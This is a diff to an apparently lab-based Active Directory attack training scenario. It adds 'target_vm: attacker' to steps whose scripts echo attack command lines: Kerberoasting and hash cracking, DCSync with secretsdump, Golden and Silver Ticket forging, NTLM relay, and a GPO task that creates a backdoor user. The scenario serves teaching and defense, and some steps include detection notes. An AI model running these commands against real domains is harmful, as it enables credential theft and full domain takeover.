@@ -24,6 +24,7 @@ steps:
     type: output_contains
     expect: AD Domain
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== AD Domain Enumeration ==='' && ldapsearch -x -H ldap://10.20.30.1 -b ''DC=lab,DC=local'' ''(objectClass=domain)'' 2>&1 | head -20 || echo ''LDAP not available - simulating:'' && echo
     ''Domain: lab.local'' && echo ''DC: 10.20.30.1'' && echo ''Functional Level: Windows Server 2019'' && echo ''Users: admin, user, svc_web, svc_sql'''
   risk_level: low
@@ -40,6 +41,7 @@ steps:
     type: output_contains
     expect: User
     field: stdout
+  target_vm: attacker
   script: 'enum4linux -a 10.20.30.1 2>&1 | head -40 || echo ''=== AD User Enumeration (Simulated) ==='' && echo ''Users:'' && echo ''  Administrator (RID: 500)'' && echo ''  Guest (RID: 501)'' && echo ''  krbtgt
     (RID: 502)'' && echo ''  svc_web (RID: 1103)'' && echo ''  svc_sql (RID: 1104)'' && echo '''' && echo ''Groups:'' && echo ''  Domain Admins: Administrator'' && echo ''  Domain Users: svc_web, svc_sql,
     user1'''
@@ -59,6 +61,7 @@ steps:
     type: output_contains
     expect: BloodHound
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== BloodHound Data Collection ===\n\n[bloodhound-python]\nbloodhound-python -d lab.local -u user -p password -c All -ns 10.20.30.1\n\n[Collection Methods (-c)]\nDefault: Group, Session,
     Trusts, ACL, ObjectProps\nAll: + LoggedOn, SPNTargets, Container\nDCOnly: LDAP only (no SMB, stealthier)\n\n[Output Files]\n- computers.json: Domain computers\n- users.json: Domain users + properties\n-
     groups.json: Group memberships\n- sessions.json: Active sessions\n- domains.json: Domain info + trusts\n\n[Analysis Queries]\n- Shortest path to Domain Admin\n- Kerberoastable accounts\n- Unconstrained
@@ -79,6 +82,7 @@ steps:
     type: output_contains
     expect: Kerberoasting
     field: stdout
+  target_vm: attacker
   script: echo '=== Kerberoasting via Impacket ===' && echo 'impacket-GetUserSPNs lab.local/user:password -dc-ip 10.20.30.1 -request' && echo '' && echo 'Sample output:' && echo 'ServicePrincipalName  Name     MemberOf                    PasswordLastSet'
     && echo 'MSSQLSvc/db:1433     svc_sql  CN=Domain Admins,...         2025-01-15' && echo 'HTTP/web.lab.local   svc_web  CN=Web Admins,...            2024-06-20' && echo '' && echo 'Ticket hash (example):'
     && echo '$krb5tgs$23$*svc_sql$LAB.LOCAL$MSSQLSvc/db~1433*$a1b2c3...' && echo '' && echo 'Cracking:' && echo 'hashcat -m 13100 ticket.hash /usr/share/wordlists/rockyou.txt' && echo 'john ticket.hash
@@ -98,6 +102,7 @@ steps:
     type: output_contains
     expect: DCSync
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== DCSync Attack ===\n\n[Concept]\n- Abuses AD replication protocol (MS-DRSR)\n- Pretends to be a Domain Controller\n- Requests password data via GetNCChanges\n\n[Required Privileges]\n-
     Replicating Directory Changes\n- Replicating Directory Changes All\n- Default: Domain Admins, Enterprise Admins, DC computer accounts\n\n[Execution]\nimpacket-secretsdump lab.local/admin:password@10.20.30.1\nimpacket-secretsdump
     -just-dc-user krbtgt lab.local/admin:password@10.20.30.1\n\n[Output]\nAdministrator:500:aad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404ee:KRBTGT_NTLM_HASH:::\n\n[Detection]\n-
@@ -117,6 +122,7 @@ steps:
     type: output_contains
     expect: Golden Ticket
     field: stdout
+  target_vm: attacker
   script: echo -e '=== Golden Ticket Attack ===\n\n[Prerequisites]\n- krbtgt NTLM hash (from DCSync)\n- Domain SID\n- Domain name\n\n[Creation - Impacket]\nimpacket-ticketer -nthash KRBTGT_HASH -domain-sid
     S-1-5-21-XXX -domain lab.local Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec lab.local/Administrator@dc -k -no-pass\n\n[Creation - Mimikatz]\nkerberos::golden /user:Administrator
     /domain:lab.local /sid:S-1-5-21-XXX /krbtgt:HASH /ticket:golden.kirbi\n\n[Capabilities]\n- Impersonate ANY user (including non-existent)\n- Valid for 10 years by default\n- Survives password resets
@@ -137,6 +143,7 @@ steps:
     type: output_contains
     expect: Silver Ticket
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Silver Ticket vs Golden Ticket ===\n\n[Silver Ticket]\n- Forges Service Ticket (TGS)\n- Requires: Service account NTLM hash\n- Scope: Single service only\n- Does NOT contact KDC\n-
     Harder to detect (no TGT request)\n\n[Creation]\nimpacket-ticketer -nthash SVC_HASH -domain-sid S-1-5-21-XXX -domain lab.local -spn MSSQLSvc/db.lab.local Administrator\n\n[Golden Ticket]\n- Forges TGT\n-
     Requires: krbtgt NTLM hash\n- Scope: Entire domain\n- Contacts KDC for TGS\n- Event 4769 generated\n\n[Comparison]\nAttribute     | Golden          | Silver\nHash needed   | krbtgt          | Service
@@ -156,6 +163,7 @@ steps:
     type: output_contains
     expect: AD ACL Abuse
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== AD ACL Abuse ===\n\n[Dangerous ACEs]\n\nGenericAll (Full Control)\n- On User: Reset password, modify group membership\n- On Group: Add members (add self to Domain Admins)\n- On
     Computer: Resource-based constrained delegation\n\nGenericWrite\n- On User: Modify attributes (SPN for Kerberoasting)\n- On Computer: Modify msDS-AllowedToActOnBehalfOfOtherIdentity\n\nWriteDacl\n-
     Modify ACL of target object\n- Grant self GenericAll, then escalate\n\nForceChangePassword\n- Reset target user password without knowing current\n\nWriteOwner\n- Take ownership of object, then modify
@@ -176,6 +184,7 @@ steps:
     type: output_contains
     expect: Unconstrained Delegation
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Unconstrained Delegation Attack ===\n\n[Concept]\n- System trusted for delegation stores user TGTs\n- Any user authenticating to this system leaves their TGT in memory\n\n[Discovery]\nGet-DomainComputer
     -Unconstrained (PowerView)\nldapsearch: (userAccountControl:1.2.840.113556.1.4.803:=524288)\n\n[Attack]\n1. Compromise unconstrained delegation host\n2. Coerce authentication from DC (PrinterBug/PetitPotam)\n3.
     Capture DC TGT from memory (Rubeus/mimikatz)\n4. Use DC TGT for DCSync\n\n[Coercion Methods]\n- PrinterBug (MS-RPRN): SpoolSample.exe DC ATTACKER\n- PetitPotam (MS-EFSRPC): PetitPotam.py ATTACKER DC\n\n[Defense]\n-
@@ -195,6 +204,7 @@ steps:
     type: output_contains
     expect: NTLM Relay
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== NTLM Relay Attack ===\n\n[Step 1: Poisoning with Responder]\nresponder -I eth0 -rdwv\n- Poisons LLMNR/NBT-NS/mDNS queries\n- Captures NTLMv2 hashes\n\n[Step 2: Relay with ntlmrelayx]\nimpacket-ntlmrelayx
     -tf targets.txt -smb2support\n\n[Relay Targets]\n- SMB -> Remote code execution (if SMB signing disabled)\n- LDAP -> Modify AD objects (add computer, change ACL)\n- HTTP -> Access web applications\n\n[Advanced:
     RBCD Attack via LDAP Relay]\nntlmrelayx --delegate-access -t ldap://DC\n-> Creates computer account\n-> Sets RBCD on target\n-> S4U2Self/S4U2Proxy for impersonation\n\n[Defense]\n- Enable SMB signing
@@ -214,6 +224,7 @@ steps:
     type: output_contains
     expect: GPO Abuse
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== GPO Abuse ===\n\n[Concept]\n- Group Policy Objects define settings for users/computers\n- Modifying a GPO affects all linked OUs\n\n[Attack Prerequisites]\n- GPC write access (GenericAll/GenericWrite
     on GPO)\n- GPO linked to target OU\n\n[Exploitation Methods]\n1. Scheduled Task: Add immediate task that runs as SYSTEM\n   SharpGPOAbuse --AddComputerTask --TaskName "Backdoor" --Author admin --Command
     "cmd.exe" --Arguments "/c net user backdoor P@ss /add"\n\n2. Computer Startup Script:\n   Place script in GPO SYSVOL path\n\n3. Registry modification:\n   Add Run key for persistence\n\n[Tools]\n- SharpGPOAbuse\n-
@@ -233,6 +244,7 @@ steps:
     type: output_contains
     expect: Domain Trust
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Domain Trust Attacks ===\n\n[Trust Types]\n- Parent-Child: Bidirectional, transitive (Forest internal)\n- Forest: Can be one-way or bidirectional\n- External: Non-transitive\n\n[Enumeration]\nnltest
     /domain_trusts (Windows)\nGet-DomainTrust (PowerView)\n\n[Cross-Domain Attacks]\n\n1. SID History Injection\n- Add Enterprise Admin SID to Golden Ticket\n- Works across parent-child trusts\n- Blocked
     by SID filtering in forest trusts\n\n2. Trust Key Abuse\n- DCSync trust account hash\n- Create inter-realm TGT\n- Access resources in trusted domain\n\n3. Foreign Group Membership\n- Users from Domain
@@ -253,6 +265,7 @@ steps:
     type: output_contains
     expect: ADCS
     field: stdout
+  target_vm: attacker
   script: echo -e '=== AD Certificate Services (ADCS) Attacks ===\n\n[ESC1] Misconfigured Certificate Template\n- Template allows SAN (Subject Alternative Name)\n- Low-privilege user can request cert as
     anyone\n- certipy req -ca CA -template VulnTemplate -upn admin@lab.local\n\n[ESC4] Template Access Control\n- User has write access to certificate template\n- Modify template to enable ESC1 conditions\n\n[ESC6]
     EDITF_ATTRIBUTESUBJECTALTNAME2\n- CA flag allows SAN in any request\n- Any template becomes ESC1-like\n\n[ESC8] NTLM Relay to HTTP Enrollment\n- Relay NTLM auth to CA web enrollment\n- Request certificate
@@ -274,6 +287,7 @@ steps:
     type: output_contains
     expect: AD Persistence
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== AD Persistence Techniques ===\n\n[1] AdminSDHolder\n- Protected objects synced every 60 min by SDProp\n- Add ACE to AdminSDHolder -> propagates to all protected groups\n- Survives
     manual ACL cleanup\n\n[2] DCShadow\n- Register rogue DC in AD\n- Push malicious changes via replication\n- Changes appear legitimate (from DC)\n\n[3] Skeleton Key\n- Patch LSASS on DC\n- Universal password
     (mimikatz) for any account\n- Lost on DC reboot\n\n[4] DSRM Abuse\n- Directory Services Restore Mode password\n- Local admin on DC\n- DsrmAdminLogonBehavior=2 enables network login\n\n[5] Machine Account
@@ -350,6 +364,7 @@ steps:
     type: output_contains
     expect: AD Attack Kill Chain
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/ad_attack_report.txt << ''EOF''
 
     === AD Attack Kill Chain Report ===
